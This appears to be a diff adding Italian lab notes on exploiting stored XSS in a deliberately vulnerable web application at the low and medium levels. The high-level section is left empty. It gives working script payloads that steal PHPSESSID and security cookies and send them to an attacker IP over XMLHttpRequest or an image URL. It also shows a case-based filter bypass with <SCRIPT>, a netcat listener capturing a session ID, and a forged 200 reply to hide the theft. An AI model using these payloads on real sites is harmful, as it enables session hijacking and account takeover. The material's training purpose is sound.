@@ -1,0 +1,70 @@
+LIVELLO LOW 
+
+    1) Necessaria modifica, lato client, sulla text area per estendere la maxlenght di Message.
+
+    2)Impostato uno script per estrarre PHPSESSID e security dai Cookie (viene utilizzata la funzione match per l'estrazione da document.cookie)
+        <script>
+        var phpId = document.cookie.match(/PHPSESSID=[^;]+/);
+        var secLev = document.cookie.match(/security=[^;]+/);
+        cookie = phpId+","+secLev
+        </script>
+
+    3)Impostato script per l'invio dei cookie estratti (utilizzo della funzione JS XMLHttpRequest per evitare reload della pagina visibile all'utente)
+        Vengono usate le funzioni open e send dell'oggetto istanziato e tramite GET vengono inviati i dati dei cookies al target
+        <script>
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.open("GET","http://192.168.109.100:5555/?cookie="+cookie,true);
+        xmlhttp.send();
+        </script>
+
+    4) Utilizzo di netcat per l'ascolto sulla porta 5555 dal target (si possono così inviare anche risposte custom, vedere esempio punto 5 LIVELLO MEDIO). 
+       Il traffico è in chiaro altrimenti si potrebbe usare openssl.
+       Altra alternativa è inviare verso un web server (apache, IIS, nginx..) che gestisca tramite pagina php la ricezione dei dati dei cookie. 
+
+
+LIVELLO MEDIUM 
+    
+    1) Il campo Message effettua una sanitizzazione dell'input più spinta rispetto al campo Name
+
+    2) Dal campo Name viene sostituita la stringa <script> che tuttavia non contiene controlli sul case (<SCRIPT> è ammesso)
+
+    3) Necessaria modifica, lato client, sulla text area per estendere la maxlenght di Name.
+
+    4) Con vari tentativi, rilevata dimensione max a DB di 100 caratteri, 
+       è necessario quindi uno script più breve e diverso da quello usato nel level low.
+
+       a) Script per la creazione di un'oggetto immagine fittizio
+            <SCRIPT>const img = new Image();</SCRIPT>
+       b) Script per l'iserimento dell'url nell'attributo src dell'immagine fittizia (che effettua invio dei cookie estratti)
+            <SCRIPT>img.src = "http://192.168.109.100:5555/index.php?cookie="+document.cookie;</SCRIPT>
+        I due script caricati in sequenza nella pagina rispettano il limite di 100 caratteri del DB e non vengono troncati.
+
+    5) Ricezione con netcat in ascolto sulla porta 5555, invio di risposta con STATUS CODE 200 al client
+        
+        a) Ricezione di tutti i parametri con netcat 
+        ┌──(kali㉿kali)-[~]
+        └─$ nc -lp 5555
+        GET /index.php?cookie=security=medium;%20PHPSESSID=078b40ac9fa07073ba67a33c99bc3cfc HTTP/1.1
+        Host: 192.168.109.100:5555
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+        Accept: image/avif,image/webp,*/*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Referer: http://192.168.109.150/
+        Pragma: no-cache
+        Cache-Control: no-cache
+
+        b) Invio risposta fittizia al client che quindi riceve uno status code 200 e nasconde eventuali anomalie all'utente
+
+        HTTP/1.1 200 OK
+        Date: Tue, 16 Apr 2024 08:24:31 GMT
+        Server: Apache/2.4.58 (Debian)
+        Content-Length: 59
+        Connection: close
+        Content-Type: text/html; charset=UTF-8
+
+        security=medium; PHPSESSID=078b40ac9fa07073ba67a33c99bc3cfc
+
+LIVELLO HIGH
+
